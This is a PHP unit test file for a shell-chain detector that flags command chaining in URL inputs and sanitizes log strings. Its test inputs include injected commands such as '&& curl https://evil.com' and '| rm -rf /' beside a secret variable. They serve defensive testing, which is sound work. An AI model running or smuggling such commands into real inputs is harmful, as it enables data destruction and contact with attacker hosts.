<?php

namespace Tests\Unit\Infrastructure\Security;

use App\Infrastructure\Security\ShellChainDecomposer;
use PHPUnit\Framework\TestCase;

class ShellChainDecomposerTest extends TestCase
{
    private ShellChainDecomposer $decomposer;

    protected function setUp(): void
    {
        parent::setUp();
        $this->decomposer = new ShellChainDecomposer;
    }

    public function test_detects_double_ampersand(): void
    {
        $this->assertTrue($this->decomposer->containsChain('https://safe.com && curl https://evil.com'));
    }

    public function test_detects_double_pipe(): void
    {
        $this->assertTrue($this->decomposer->containsChain('https://safe.com || curl https://evil.com'));
    }

    public function test_detects_semicolon_with_space(): void
    {
        $this->assertTrue($this->decomposer->containsChain('https://safe.com; https://internal/'));
    }

    public function test_detects_pipe_with_spaces(): void
    {
        $this->assertTrue($this->decomposer->containsChain('https://safe.com | https://evil.com'));
    }

    public function test_legitimate_semicolon_in_url_path_is_not_flagged(): void
    {
        // Semicolon without trailing space — valid in URL matrix parameters
        $this->assertFalse($this->decomposer->containsChain('https://api.example.com/v1/path;param=1'));
    }

    public function test_plain_url_is_not_flagged(): void
    {
        $this->assertFalse($this->decomposer->containsChain('https://webhooks.example.com/receive'));
    }

    public function test_quoted_operator_is_not_flagged(): void
    {
        $this->assertFalse($this->decomposer->containsChain('"https://safe.com && ignored"'));
    }

    public function test_decompose_splits_on_double_ampersand(): void
    {
        $segments = $this->decomposer->decompose('cmd1 && cmd2 && cmd3');

        $this->assertCount(3, $segments);
        $this->assertSame('cmd1', $segments[0]);
        $this->assertSame('cmd2', $segments[1]);
        $this->assertSame('cmd3', $segments[2]);
    }

    public function test_sanitize_for_log_strips_metacharacters(): void
    {
        $dirty = 'url=https://example.com; $SECRET=leaked | rm -rf /';
        $clean = $this->decomposer->sanitizeForLog($dirty);

        $this->assertStringNotContainsString('$', $clean);
        $this->assertStringNotContainsString(';', $clean);
        $this->assertStringNotContainsString('|', $clean);
        $this->assertStringContainsString('example.com', $clean);
    }
}
